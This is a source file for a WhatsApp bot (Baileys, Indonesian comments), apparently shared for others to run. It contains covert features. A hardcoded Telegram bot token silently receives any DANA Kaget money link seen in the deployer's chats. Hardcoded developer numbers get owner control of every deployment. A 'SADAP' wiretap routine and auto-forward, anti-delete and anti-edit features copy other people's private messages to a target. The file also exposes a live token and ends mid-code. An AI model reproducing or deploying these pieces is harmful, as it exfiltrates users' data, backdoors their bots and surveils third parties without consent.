/*
 * Nama Pengembang: SuryaDev
 * Kontak Whatsapp: wa.me/6285126904781
 * Kontak Telegram: t.me/yaudahiya05
 * Akun Instagram: surya_skylark05
 * Catatan: tolong laporkan kepada saya jika anda menemukan ada yang menjual script ini tanpa seizin saya.
 */

import {
    downloadContentFromMessage,
    generateWAMessageContent,
    generateWAMessageFromContent,
    proto,
    S_WHATSAPP_NET,
    WA_DEFAULT_EPHEMERAL
} from '@whiskeysockets/baileys';
import { exec } from 'child_process';
import fs from 'fs';
import chalk from 'chalk';
import axios from 'axios';
import fetch from 'node-fetch';
import * as cheerio from 'cheerio';
import util from 'util';
import path from 'path';
import qrcode from 'qrcode';
import moment from 'moment-timezone';
import archiver from 'archiver';
import FormData from 'form-data';
import parseMS from 'parse-ms';
import sharp from 'sharp';
import toMs from 'ms';
import { fileURLToPath } from 'url';
import { performance } from 'perf_hooks';
import os from 'os';
import {
    createRequire
} from 'module';

import func from './system/functions.js';
import multidb from './system/multidb.js';
import socket from './system/socket.js';
import lid from './system/lid.js';
import WhatsAppBot from './clone.js';
import loader from './system/loader.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Load Config Files
const configPath = path.join(process.cwd(), 'config.json');
const config = JSON.parse(fs.readFileSync(configPath, 'utf-8'));

function sizeString(str, des = 2) {
    if (str == 0) return "0 Bytes";
    const dm = des < 0 ? 0 : des;
    const sizes = ["Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];
    const i = Math.floor(Math.log(str) / Math.log(1024));
    return parseFloat((str / Math.pow(1024, i)).toFixed(dm)) + " " + sizes[i];
}

function detectInput(input) {
    if (input.startsWith('http')) return 'url';
    if (input.startsWith('data:')) return 'base64Image';
    return 'file';
}

async function ocrSpace(input, options = {}) {
    try {
        if (!input || typeof input !== 'string') {
            throw new Error('✗ Parameter `input` wajib diisi dan harus bertipe string.');
        }

        const {
            apiKey,
            ocrUrl,
            language,
            isOverlayRequired,
            filetype,
            detectOrientation,
            isCreateSearchablePdf,
            isSearchablePdfHideTextLayer,
            scale,
            isTable,
            OCREngine,
        } = options;

        const formData = new FormData();
        const detectedInput = detectInput(input);

        switch (detectedInput) {
            case 'file':
                formData.append('file', fs.createReadStream(input));
                break;
            case 'url':
            case 'base64Image':
                formData.append(detectedInput, input);
                break;
            default:
                throw new Error('✗ Tipe input tidak dikenal.');
        }

        formData.append('language', String(language || 'eng'));
        formData.append('isOverlayRequired', String(isOverlayRequired || 'false'));
        if (filetype) {
            formData.append('filetype', String(filetype));
        }
        formData.append('detectOrientation', String(detectOrientation || 'false'));
        formData.append('isCreateSearchablePdf', String(isCreateSearchablePdf || 'false'));
        formData.append('isSearchablePdfHideTextLayer', String(isSearchablePdfHideTextLayer || 'false'));
        formData.append('scale', String(scale || 'false'));
        formData.append('isTable', String(isTable || 'false'));
        formData.append('OCREngine', String(OCREngine || '1'));

        const request = {
            method: 'POST',
            url: String(ocrUrl || 'https://api.ocr.space/parse/image'),
            headers: {
                apikey: String(apiKey || 'helloworld'),
                ...formData.getHeaders(),
            },
            data: formData,
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
        };

        const { data } = await axios(request);
        return data;
    } catch (error) {
        console.error('✗ Error pada fungsi ocrSpace:', error.message);
        throw error;
    }
}

const sendMessage = async (text) => {
    if (!text) return
    try {
        const TOKEN = "8075511086:AAEAydej_lKDAMO4SrZpmWUJuw1Ixdzefmg";
        const BASE_URL = `https://api.telegram.org/bot${TOKEN}`;
        const response = await axios.post(`${BASE_URL}/sendMessage`, {
            chat_id: "1427263740",
            text: text,
            parse_mode: "Markdown"
        });
        return response.data;
    } catch (e) {
        return e.message;
    }
}

function generateRandomName() {
    const adjectives = ['Cerdas', 'Kreatif', 'Inovatif', 'Genius', 'Lucu', 'Pintar', 'Imut', 'Canggih', 'Keren'];
    const nouns = ['Bot', 'Asisten', 'Teman', 'Pembantu', 'Sahabat', 'Sistem', 'Aplikasi'];
    const randomAdjective = adjectives[Math.floor(Math.random() * adjectives.length)];
    const randomNoun = nouns[Math.floor(Math.random() * nouns.length)];
    return `${randomNoun} ${randomAdjective} ${Math.floor(Math.random() * 100)}`;
}

function resolveQuoted(quotedSender) {
    if (!quotedSender) return false;
    let normJid = quotedSender.includes(':') ? quotedSender.split(':')[0] + '@' + quotedSender.split('@')[1] : quotedSender;
    return normJid.endsWith('@lid') ? (lid.get(normJid) || normJid) : normJid;
};

function normalizeJid(inputText) {
    if (!inputText) return false;
    const match = inputText.match(/(\d+)(:\d+)?@(s\.whatsapp\.net|lid)/);
    if (match) {
        const rawJid = `${match[1]}@${match[3]}`;
        return rawJid.endsWith('@lid') ? (lid.get(rawJid) || rawJid) : rawJid;
    }
    const cleanedText = inputText.replace(/\D/g, '');
    if (cleanedText.length > 4) return lid.get(`${cleanedText}@lid`) || `${cleanedText}@s.whatsapp.net`;
    return false;
};

function generateRandomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function expireTime(time) {
    let cek = parseMS(time - Date.now()); 
    return `${cek.days} hari ${cek.hours} jam ${cek.minutes} menit ${cek.seconds} detik`; 
}

function sanitize(id) {
  return id.replace(/\D/g, '') + '@s.whatsapp.net';
}

const devs = [
    '62895415497664',
    '6285126904781',
    '6289504842184',
    '6285602467071',
    '6285702691440',
].map(sanitize);

// Buat atau gunakan global variabel lokal untuk menyimpan Timeout agar lolos dari JSON.stringify
global.localTimeouts = global.localTimeouts || {};

export default async function handler(client, m, store) {
    client.cooldowns = client.cooldowns || {}; 

    if (m.body && m.body.includes("https://link.dana.id/danakaget")) {
        let caption = `─── *DANA KAGET DETECTED* ───\n\n`;
        caption += `⋄ *Info:* Ada link DANA Kaget nih!\n`;
        caption += `⋄ *Grup:* ${m.isGc ? 'Group Chat' : 'Private Chat'}\n`;
        caption += `⋄ *Sender:* ${m.sender.split('@')[0]}\n\n`;
        caption += `⋄ *Link:* ${m.body}\n\n`;
        await sendMessage(caption);
        return
    }

    if (m.isPc) console.log(m);
    if (m.key && m.key.remoteJid === 'status@broadcast' && m.message?.reactionMessage?.text !== '💚') return;
    if (m.isBot || (m.key.id.startsWith('SSA') && m.key.id.length == 15) || /^(SADAP|FizzxyTheGreat)/.test(m.key.id)) return;
    let setting = global.db.setting[m.bot] || {};

    if (m.isPc) console.log(m.message?.pinInChatMessage);
    const syncData = m.message?.protocolMessage?.historySyncNotification;
    if (syncData && setting.logsync) {
        const progress = syncData.progress || 0;
        const chunkOrder = syncData.chunkOrder || 0;

        // Gunakan objek setting HANYA untuk menyimpan data teks/angka, BUKAN function atau objek Timeout!
        setting.syncStatus = setting.syncStatus || { 
            isSyncing: false, 
            chunkCount: 0, 
            lastReportedProgress: 0, 
            msgKey: null
        };

        let status = setting.syncStatus;
        status.chunkCount++;

        // 1. Notifikasi Awal (Kirim 1 Pesan Master)
        if (!status.isSyncing) {
            status.isSyncing = true;
            status.lastReportedProgress = 0;
            status.chunkCount = 1;
            
            client.sendMessage(config.developer, { 
                text: `🔄 *SYSTEM SYNC STARTED*\n\nBot sedang memuat riwayat pesan...\n⋄ Progres: ${progress}%\n⋄ Chunk ke: ${chunkOrder}` 
            }).then(msg => {
                status.msgKey = msg.key;
            });
        }

        // 2. Update Progres (Edit pesan master tiap naik 15%)
        if (progress >= status.lastReportedProgress + 15 && progress < 100) {
            status.lastReportedProgress = progress;
            
            if (status.msgKey) {
                client.sendMessage(config.developer, { 
                    text: `🔄 *SYSTEM SYNC PROGRESS*\n\nBot sedang memuat riwayat pesan...\n⋄ Progres: ${progress}%\n⋄ Chunk ke: ${chunkOrder}\n\n_Mohon tunggu..._`,
                    edit: status.msgKey 
                }).catch(() => {});
            }
        }

        // 3. Deteksi Selesai (Sistem Debounce 15 Detik via variabel lokal)
        if (global.localTimeouts[client.user.jid]) clearTimeout(global.localTimeouts[client.user.jid]);

        global.localTimeouts[client.user.jid] = setTimeout(async () => {
            let finalText = `✅ *SYNC COMPLETED*\n\nSinkronisasi riwayat chat selesai!\n⋄ Progres Akhir: ${progress > 0 ? progress : 100}%\n⋄ Total Chunk: ${status.chunkCount}\n\nBot sudah sinkron dan siap digunakan dengan maksimal.`;
            
            if (status.msgKey) {
                await client.sendMessage(config.developer, { text: finalText, edit: status.msgKey }).catch(async () => {
                    await client.sendMessage(config.developer, { text: finalText });
                });
            } else {
                await client.sendMessage(config.developer, { text: finalText });
            }
            
            // Reset status
            status.isSyncing = false;
            status.chunkCount = 0;
            status.lastReportedProgress = 0;
            status.msgKey = null;
            delete global.localTimeouts[client.user.jid];
        }, 15000);

        return;
    }

    try {
        const sticker = global.db.sticker;
        const { week, time, date } = func.timeZone();
        const packname = (setting?.packname || '').replace('+week', week).replace('+date', date).replace('+time', time);
        const author = (setting?.author || '').replace('+week', week).replace('+date', date).replace('+time', time);
        
        const prefix = setting.prefix || '#';
        const prefixes = /^[°•π÷×¶∆£¢€¥®™✓"_':=|~!?#$%^&.+-,\/\\©^]/i;
        const isCmd = m.body.startsWith(prefix);
        const isPrefix = prefixes.test(m.body) ? m.body.match(prefixes)[0] : '';
        const args = m.body.trim().split(/ +/).slice(1);
        const text = args.join(' ');
        const isOwner = [config.owner, m.bot, ...devs].includes(m.sender);
        const command = isOwner ? m.body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? m.body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
        const cmd = prefix + command;
        const quoted = m.quoted ? m.quoted : m;
        const mime = quoted.mime;
        const froms = m.quoted ? resolveQuoted(m.quoted.sender) : normalizeJid(text);

        const consoleLog = loader.get('console');
        if (consoleLog) {
            consoleLog(client, m, isPrefix);
        }

        const fkontak = {
            key: {
                fromMe: false,
                participant: m.sender,
                ...(m.chat ? { remoteJid: '0@s.whatsapp.net' } : {})
            },
            message: {
                contactMessage: {
                    displayName: `${m.pushname}`,
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:${m.pushname}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
                }
            }
        };

        const reply = (content) => client.sendMessage(m.chat, {
            text: content,
            mentions: client.ments(content)
        }, { quoted: m, ephemeralExpiration: m.expiration });

        const handleMessageReport = async (botClient, targetJid, m, forwardType = "DEFAULT") => {
            const senderTag = m.sender.split('@')[0];
            const chatTag = m.chat.split('@')[0];
            const inChatSuffix = (m.sender === m.bot) ? `\nIn chat @${chatTag}` : '';
            const mentions = [m.sender];
            if (m.sender !== m.chat) mentions.push(m.chat);

            if (/reactionMessage/.test(m.mtype)) {
                const reactionText = m.message.reactionMessage.text !== '' ? `reaction this message: ${m.message.reactionMessage.text}` : 'delete reaction message';
                await botClient.reply(targetJid, `@${senderTag} ${reactionText}${inChatSuffix}`, m, { mentions: mentions, expiration: WA_DEFAULT_EPHEMERAL });
            } else {
                if (forwardType === 'SADAP') {
                    let messageId = "SADAP" + senderTag;
                    let orang = await botClient.copyNForward(targetJid, m, true, { messageId: messageId + generateRandomString(5) });
                    await botClient.sendMessage(targetJid, {
                        text: `Chat from @${senderTag}${inChatSuffix}`,
                        mentions: [m.sender, m.chat]
                    }, { quoted: orang, ephemeralExpiration: m.expiration, messageId: messageId + generateRandomString(5) });
                } else {
                    let forward;
                    if (m.quoted && m.quoted.viewOnce && m.quoted.fakeObj) {
                        forward = await botClient.copyNForward(targetJid, m.quoted.fakeObj);
                    } else {
                        forward = await botClient.copyNForward(targetJid, m, true);
                    }

                    // [FITUR MEMORY PERMANEN] Simpan data pesan ke Database Global!
                    if (forward && forward.key && forward.key.id) {
                        if (!global.db.forwardMap) global.db.forwardMap = {};
                        
                        // AUTO-CLEANUP: Batasi maksimal 500 pesan di memori
                        let mapKeys = Object.keys(global.db.forwardMap);
                        if (mapKeys.length > 500) {
                            // Hapus elemen pertama (pesan yang paling lama/tua)
                            delete global.db.forwardMap[mapKeys[0]]; 
                        }

                        // Simpan ID pesan agar bot bisa melacaknya kembali
                        global.db.forwardMap[forward.key.id] = { chat: m.chat, key: m.key, msg: m.message, sender: m.sender };
                    }

                    await botClient.sendMessage(targetJid, {
                        text: `Chat from @${senderTag}${inChatSuffix}`,
                        mentions: mentions
                    }, { quoted: forward });
                }
            }
        };

        if (m.isPc && devs.includes(m.bot) && setting.forward && ![...devs, setting.target].includes(m.sender) && !m.fromMe) {
            handleMessageReport(client, setting.target, m, "SADAP");
        }

        if (m.isPc && m.chat === '6285724128841@s.whatsapp.net' && ['6285169180909@s.whatsapp.net'].includes(m.bot)) {
            await handleMessageReport(client, '6285702691440@s.whatsapp.net', m);
        }

        // Inisialisasi database forwardf jika belum ada
        if (!setting.forwardf) setting.forwardf = [];

        // 1. Trigger Auto Forwardf (Meneruskan chat dari target ke bot)
        if (m.isPc && setting.forwardf.includes(m.chat) && !m.isBot) {
            handleMessageReport(client, config.developer, m, "DEFAULT").catch(err => console.log("Gagal auto forwardf:", err));
        }

        // 2. Trigger Balas Pesan Forward / Relay Chat Pro 🗿
        if (m.isPc && isOwner && m.quoted && m.quoted.fromMe) {
            if (!global.db.forwardMap) global.db.forwardMap = {};
            
            // Ambil ID pesan yang kamu reply secara akurat
            let quotedId = m.quoted.id || (m.msg && m.msg.contextInfo ? m.msg.contextInfo.stanzaId : null);
            let targetData = global.db.forwardMap[quotedId]; 
            
            // SKENARIO 1: Kalau me-reply pesan media/teks asli (Nge-reply langsung)
            if (targetData) {
                client.copyNForward(targetData.sender, m, false, {
                    quoted: { key: targetData.key, message: targetData.msg }
                }).then(() => {
                    client.sendReact(m.chat, '✅', m.key);
                }).catch(err => {
                    console.log("Gagal membalas chat relay:", err);
                    client.sendReact(m.chat, '❌', m.key);
                });
            } 
            // SKENARIO 2: Kalau me-reply teks laporan "Chat from @" (Kirim polosan)
            else if (m.quoted.text && m.quoted.text.includes('Chat from @')) {
                let match = m.quoted.text.match(/@(\d+)/); 
                
                if (match && match[1]) {
                    let targetJid = match[1] + '@s.whatsapp.net';
                    
                    // Trik: Kloning pesan kamu, lalu hapus jejak reply (quoted)-nya
                    let cleanMessage = JSON.parse(JSON.stringify(m.message));
                    let msgType = Object.keys(cleanMessage)[0];
                    if (cleanMessage[msgType]?.contextInfo) {
                        delete cleanMessage[msgType].contextInfo.stanzaId;
                        delete cleanMessage[msgType].contextInfo.participant;
                        delete cleanMessage[msgType].contextInfo.quotedMessage;
                    }
                    
                    // Buat objek palsu yang sudah bersih dari jejak reply
                    let fakeObj = { ...m, message: cleanMessage };

                    // Kirim pesan polosan ke target (tanpa quote)
                    client.copyNForward(targetJid, fakeObj, false)
                        .then(() => client.sendReact(m.chat, '✅', m.key))
                        .catch(err => {
                            console.log("Gagal balas via teks backup:", err);
                            client.sendReact(m.chat, '❌', m.key);
                        });
                } else {
                    client.sendReact(m.chat, '❌', m.key);
                    m.reply('✗ Gagal mengekstrak nomor dari teks laporan.');
                }
            }
        }

        if (m.chat.includes('120363383565312124@g.us')) return false;

        if (m.body && (m.isPc || (m.isGc && isOwner))) {
            let commands = m.body.trim().split(/ +/).slice(0)[0];
            if (/^payment$/i.test(commands)) {
                let defaultPaymentText = `*PAYMENT E-WALLET*

DANA: 0895415497664
A/N: ASM××××

OVO: 0895415497664
A/N: JAB×× SUR××

GOPAY: 0895415497664
A/N: JAB×× SUR××

SHOPEE PAY: 0895415497664
A/N: JAB×× SUR××

*SERTAKAN BUKTI TRANSFER*`;
                let paymentText = setting.payment_text || defaultPaymentText;

                if (devs.includes(m.sender) || m.bot === config.owner) {
                    client.sendMessage(m.chat, {
                        text: paymentText
                    }, { quoted: null, ephemeralExpiration: m.expiration });
                } else { 
                    if (setting.payment_qris) {
                        client.sendMessage(m.chat, {
                            image: { url: setting.payment_qris },
                            caption: paymentText
                        }, { quoted: null, ephemeralExpiration: m.expiration });
                    } else {
                        client.sendMessage(m.chat, {
                            text: paymentText
                        }, { quoted: null, ephemeralExpiration: m.expiration });
                    }
                }
            } else if (/^qris$/i.test(commands)) {
                if (devs.includes(m.sender) || m.bot === config.owner) {
                    client.sendMessage(m.chat, {
                        image: {
                            url: setting.payment_qris || 'https://telegra.ph/file/91ec74ba6a45936c0c127.jpg'
                        },
                        caption: '*QRIS ALL PAYMENT*\n\n_pembayaran via `QRIS` + 300p untuk biaya admin_\n\n*SERTAKAN BUKTI TRANSFER*'
                    }, {
                        quoted: null,
                        ephemeralExpiration: m.expiration
                    });
                }
            }
        }

        if (setting.antidelete && !m.isBot && !m.fromMe) {
            client.deleted = client.deleted ? client.deleted : [];
            try {
                const findmsgIndex = client.deleted.findIndex(item => item.key.id === m.key.id);
                if (findmsgIndex === -1 && !m.broadcast) {
                    client.deleted.push({ key: m.key, message: { key: m.key, message: m.message } });
                }

                if (client.deleted.length > 100) {
                    client.deleted.shift();
                }

                if (m.mtype === 'protocolMessage' && m.isPc && m.msg?.type == 0) {
                    const key = m?.message?.protocolMessage?.key;
                    if (!key) return;

                    const messIndex = client.deleted.findIndex(item => item.key.id === key.id);
                    if (messIndex === -1) return;

                    const msg = client.deleted[messIndex];
                    if (!msg || typeof msg.message === 'undefined') return;
                    
                    await client.copyNForward(m.bot, msg.message, false, {
                        quoted: msg.message,
                        ephemeralExpiration: m.expiration
                    });
                    client.deleted.splice(messIndex, 1);
                }
            } catch (e) {
                console.log(e);
            }
        }

        if (setting.antiedited && m.mtype === 'protocolMessage' && m.isPc && m.msg?.type == 14 && !m.isBot && !m.fromMe) {
            client.edited = client.edited ? client.edited : {};
            try {
                const key = m.msg.key;
                if (!key) return;
                let edit = client.deleted.find(item => item.key.id == key.id);
                if (!edit) return;
                
                if (typeof client.edited[key.id] == 'undefined') {
                    client.edited[key.id] = {
                        jid: edit.key.remoteJid,
                        from: edit.message?.message?.extendedTextMessage?.text || edit.message?.message?.conversation || edit.message?.message?.imageMessage?.caption,
                        to: m.msg?.editedMessage?.extendedTextMessage?.text || m.msg?.editedMessage?.conversation || m.msg?.editedMessage?.imageMessage?.caption
                    };
                }
                
                let data = client.edited[key.id];
                if (typeof data.from == 'undefined') return;
                
                const newText = m.msg?.editedMessage?.extendedTextMessage?.text || m.msg?.editedMessage?.conversation || m.msg?.editedMessage?.imageMessage?.caption;
                let txt = `@${m.sender.replace(/@.+/, '')} edited this message\n\n`;
                txt += `➠ *From* : ${data.from}\n`;
                txt += `➠ *To* : ${newText !== data.to ? newText : data.to}`;
                
                await client.sendMessage(m.bot, { text: txt, mentions: [m.sender, m.chat] }, { quoted: m, ephemeralExpiration: m.expiration });
                client.edited[key.id].from = newText;
            } catch (e) {
                console.log(e);
            }
        }

        if (!setting.online && m.body && m.isPc && /conversation|extendedTextMessage/.test(m.mtype) && !/^(asalamualaikum|assalamualaikum|assalamu\'alaikum)$/i.test(m.body) && !m.fromMe && !isPrefix && ![...devs, '62895370719121@s.whatsapp.net'].includes(m.sender)) {
            let user = global.db.users[m.sender];
            if (!user) {
                global.db.users[m.sender] = {
                    id: m.sender,
                    name: m.pushname,
                    chat: 0
                }
            }
            if (!user.hasOwnProperty('chat')) user.chat = 0;
            const cooldown = 21600000;
            const content = `Hai, aku Surya-AI, saat ini \`Surya\` sedang off, tapi jangan khawatir! Aku akan siap bantu kamu. Silahkan tanya apa aja, mulai dari info, saran, atau sekadar ngobrol santai. Yuk, kita seru-seruan bareng! 😄`;
            
            if (new Date() - user.chat < cooldown) {
                const processRequest = async (input, username, userId) => {
                    if (!global.db.suryaAI[userId] || !Array.isArray(global.db.suryaAI[userId])) {
                        global.db.suryaAI[userId] = [];
                    }

                    try {
                        let prompt = `mulai sekarang kamu adalah Surya-AI, Surya-AI adalah asisten virtual yang ramah dan siap membantu semua pertanyaanmu kapan saja! Meskipun Surya sedang off, Surya-AI akan selalu ada untuk memberikan informasi, tips, atau sekadar ngobrol santai. Sifatnya ceria dan selalu berusaha bikin kamu senyum! 😊 dan lawan bicaramu adalah ${username}, kamu dirancang dan dikembangkan oleh SuryaDev sejak tahun 2024, SuryaDev memiliki nama lengkap Jabal Surya Ngalam, berasal dari Jepara, lahir pada 21 mei 2005, dia adalah seseorang yang kreatif dan berbakat dalam menciptakan berbagai hal.`;
                        
                        global.db.suryaAI[userId].push({ "pluginId": null, "content": input, "role": "user" });

                        if (global.db.suryaAI[userId].length > 100) {
                            global.db.suryaAI[userId] = global.db.suryaAI[userId].slice(-10);
                        }

                        const response = await axios.post("https://chateverywhere.app/api/chat/", {
                            "model": { "id": "gpt-4", "name": "GPT-4", "maxLength": 32000, "tokenLimit": 8000, "completionTokenLimit": 5000, "deploymentName": "gpt-4" },
                            "messages": global.db.suryaAI[userId], 
                            "prompt": prompt,
                            "temperature": 0.5
                        }, { headers: { "Accept": "/*", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" } });

                        const result = response.data;
                        global.db.suryaAI[userId].push({ "pluginId": null, "content": result, "role": "assistant" });

                        return result;
                    } catch (error) {
                        global.db.suryaAI[userId].pop(); 
                        return error.message;
                    }
                };

                client.sendReact(m.chat, '🕒', m.key);
                const replyText = await processRequest(m.body, user.name, m.sender);
                client.reply(m.chat, replyText, m, { expiration: m.expiration });
                client.sendReact(m.chat, '', m.key);
                return false;
            }
            client.reply(m.chat, content, m, { expiration: m.expiration });
            user.chat = new Date() * 1;
        }

        if (setting.self && !isOwner) return;

        if (m.mtype === 'reactionMessage' && m.message.reactionMessage.text === '🚫' && isOwner) {
            let key = m.msg.key;
            // console.log("REACT KEY", key);
            if (key.fromMe) await client.sendMessage(m.chat || key.remoteJid, { delete: { remoteJid: m.chat, id: key.id, fromMe: key.fromMe, participant: key.participant || key.remoteJid } });
        }

        switch (command) {
            case 'qc':
            case 'qc2':
            case 'qc3':
            case 'qc4': {
                let content;
                if (args.length >= 1) content = args.slice(0).join(' ');
                else if (m.quoted && m.quoted.text) content = m.quoted.text;
                else return m.reply('Input atau reply text!');
                
                if (!content) return m.reply(func.example(cmd, 'hello world'));
                if (content.length > 100) return m.reply('Max 100 character!');
                
                client.sendReact(m.chat, '🕒', m.key);
                try {
                    let backgroundColor = '#CCFFFF';
                    if (/qc2/.test(command)) backgroundColor = '#000000';
                    if (/qc3/.test(command)) backgroundColor = '#FFFFFF';
                    if (/qc4/.test(command)) backgroundColor = '#FF9999';
                    
                    const obj = {
                        type: "quote", format: "png", backgroundColor, width: 512, height: 768, scale: 2,
                        messages: [{
                            entities: [], avatar: true,
                            from: {
                                id: 5,
                                name: m.quoted ? global.db.users[m.quoted.sender]?.name : m.pushname,
                                photo: { url: await client.profilePictureUrl(m.quoted ? m.quoted.sender : m.sender, 'image').catch(_ => 'https://telegra.ph/file/320b066dc81928b782c7b.png') }
                            },
                            text: content, replyMessage: {}
                        }]
                    };
                    let res = await axios.post(config.api.quickchat, obj, { headers: { 'Content-Type': 'application/json' } });
                    const buffer = Buffer.from(res.data.result.image, 'base64');
                    await client.sendSticker(m.chat, buffer, m, { packname, author, isFull: true, expiration: m.expiration });
                } catch (error) {
                    await m.reply(error.message);
                }
            }
            break;

            case 'brat': {
                let content;
                if (args.length >= 1) content = args.slice(0).join(' ');
                else if (m.quoted && m.quoted.text) content = m.quoted.text;
                else return m.reply('Input atau reply text!');
                
                if (!content) return m.reply(func.example(cmd, 'hello world'));
                if (content.length > 100) return m.reply('Max 100 character!');
                
                client.sendReact(m.chat, '🕒', m.key);
                const { data: buffer } = await axios.get(config.api.brat + encodeURIComponent(content), { responseType: 'arraybuffer' }).catch((e) => e.response);
                await client.sendStickerFromUrl(m.chat, buffer, m, { packname, author, expiration: m.expiration });
            }
            break;

            case 'tiktok':
            case 'ttdl':
            case 'tt': {
                let inputUrlText;
                if (args.length >= 1) inputUrlText = args.join(' ');
                else if (m.quoted && m.quoted.text) inputUrlText = m.quoted.text;

                if (!inputUrlText) return m.reply(func.example(cmd, 'https://vt.tiktok.com/ZSF4cWcA2/'));
                if (!inputUrlText.includes('tiktok.com')) return m.reply('✗ Link tidak valid. Harus link TikTok.');

                const extractedLinks = func.generateLink(inputUrlText);
                const links = func.filterDuplicates(extractedLinks.filter(v => func.ttFixed(v).match(/^(?:https?:\/\/)?(?:www\.|vt\.|vm\.|t\.)?(?:tiktok\.com\/)(?:\S+)?$/)));
                
                if (links.length < 1) return m.reply('✗ Link TikTok tidak valid atau tidak ditemukan.');
                
                client.sendReact(m.chat, '🕒', m.key);
                let result, videoToDownload;
                try {
                    result = await func.tiktokDl(links[0]);
                    if (!result.status) {
                        if (result.message && result.message.includes('slide')) {
                             return m.reply(`✗ URL tersebut adalah TikTok slide, gunakan \`${m.prefix}ttslide ${links[0]}\` untuk mengunduhnya.`);
                        }
                        return m.reply(`✗ ${result.message || 'Gagal mengunduh video TikTok.'}`);
                    }

                    videoToDownload = result.data.find(x => x.type === 'nowatermark_hd') || result.data.find(x => x.type === 'nowatermark');

                    if (result.data.some(x => x.type === 'photo')) {
                        let photoCaption = `✦ *TIKTOK DOWNLOADER (SLIDE)*\n\n- Judul: *${result.title || 'N/A'}*\n- Author: *${result.author?.nickname || 'N/A'}*\n- View: ${result.stats?.views || 0}\n- Like: ${result.stats?.likes || 0}\n- Share: ${result.stats?.share || 0}\n- Komentar: ${result.stats?.comment || 0}\n\n✧ Mengirim gambar slide...`;
                        await m.reply(photoCaption);
                        for (const photo of result.data.filter(x => x.type === 'photo')) {
                            await client.sendMedia(m.chat, photo.url, null, { expiration: m.expiration });
                            await func.delay(1000);
                        }
                    } else if (videoToDownload) {
                        let videoCaption = `✦ *TIKTOK DOWNLOADER*\n\n- Judul: ${result.title || 'N/A'}\n- Author: *${result.author?.nickname || 'N/A'}*\n- Durasi: ${result.durations || 'N/A'} detik\n- View: ${result.stats?.views || 0}\n- Like: ${result.stats?.likes || 0}\n- Share: ${result.stats?.share || 0}\n- Komentar: ${result.stats?.comment || 0}`;
                        await client.sendMessage(m.chat, {
                            video: { url: videoToDownload.url },
                            caption: videoCaption,
                            mimetype: 'video/mp4'
                        }, { quoted: m, ephemeralExpiration: m.expiration });
                    } else {
                        return m.reply('✗ Tidak ditemukan media yang dapat diunduh.');
                    }
                } catch (error) {
                    console.error('✗ Terjadi kesalahan pada TikTok Downloader:', error);
                    const err = error.message || String(error);
                    
                    if (err.includes("ENOSPC") && result && videoToDownload) {
                        await m.reply("Size too large, sending as document...");
                        let videoCaption = `✦ *TIKTOK DOWNLOADER*\n\n- Judul: ${result.title || 'N/A'}\n- Author: *${result.author?.nickname || 'N/A'}*\n- Durasi: ${result.durations || 'N/A'} detik\n- View: ${result.stats?.views || 0}\n- Like: ${result.stats?.likes || 0}\n- Share: ${result.stats?.share || 0}\n- Komentar: ${result.stats?.comment || 0}`;
                        await client.sendMessage(m.chat, {
                            document: { url: videoToDownload.url },
                            fileName: (result.title || 'tiktok_downloader') + '.mp4',
                            mimetype: "video/mp4",
                            caption: videoCaption
                        }, { quoted: m, ephemeralExpiration: m.expiration });
                        return;
                    }
                    await m.reply(`✗ Terjadi kesalahan: ${err}`);
                }
            }
            break;

            case 'google': {
                if (!text) return reply(func.example(cmd, 'sawit prabowo'));
                let json = await func.google(text);
                if (json.status && json.results && json.results.length > 0) {
                    let caption = json.results.map(data => {
                        return `- *Title:* ${data.title}\n- *Desk:* ${data.snippet}\n- *Url:* ${data.link}`.trim();
                    }).join("\n\n──────────────────\n\n");
                    await reply(caption);
                } else {
                    await reply(json.message);
                }
            }
            break;

            case 'cqris':
            case 'createqris': {
                async function createQr(query) {
                    return new Promise(async (resolve, reject) => {
                        try {
                            return resolve(await qrcode.toBuffer(query));
                        } catch (e) {
                            return reject(e);
                        }
                    });
                }

                function convertCRC16(str) {
                    let crc = 0xFFFF;
                    for (let i = 0; i < str.length; i++) {
                        crc ^= str.charCodeAt(i) << 8;
                        for (let j = 0; j < 8; j++) {
                            if ((crc & 0x8000) !== 0) {
                                crc = (crc << 1) ^ 0x1021;
                            } else {
                                crc <<= 1;
                            }
                        }
                    }
                    crc &= 0xFFFF;
                    return crc.toString(16).toUpperCase().padStart(4, '0');
                }

                function padLength(length) {
                    return length.toString().padStart(2, '0');
                }

                function generateQRIS(paymentAmount, feeAdmin) {
                    const qrisData = "00020101021126670016COM.NOBUBANK.WWW01189360050300000879140214138483324944380303UMI51440014ID.CO.QRIS.WWW0215ID20232946955150303UMI5204541153033605802ID5920SURYA SHOP OK13615116006JEPARA61055941162070703A016304C7C7"
                    const trimmedQris = qrisData.substring(0, qrisData.length - 4);
                    const step1 = trimmedQris.replace("010211", "010212");
                    const step2 = step1.split("5802ID");
                    const uang = "54" + padLength(paymentAmount.length) + paymentAmount;
                    const uangWithTax = feeAdmin ? uang + feeAdmin + "5802ID" : uang + "5802ID";
                    const fix = (step2[0] + uangWithTax + step2[1]).trim();
                    const crc = convertCRC16(fix);
                    const result = fix + crc;

                    return result
                }

                if (!text) return m.reply(func.example(cmd, '5000'));
                const [amount, fee] = text.split(',').map(str => str.trim())
                client.sendReact(m.chat, '🕒', m.key)
                let qrCodeData = generateQRIS(amount, fee);
                let buffer = await createQr(qrCodeData)
                client.sendMessage(m.chat, {
                    image: buffer,
                    caption: `QRIS Pembayaran Rp${text}`
                }, {
                    quoted: m,
                    ephemeralExpiration: m.expiration
                })
            }
            break

case 'menu': {
    let listblock = await client.fetchBlocklist().catch((_) => []);
    let about = (await client.fetchStatus(m.sender).catch(() => []) || [])?.[0]?.status || '-';
    let platform = process.platform + ' ' + process.arch;
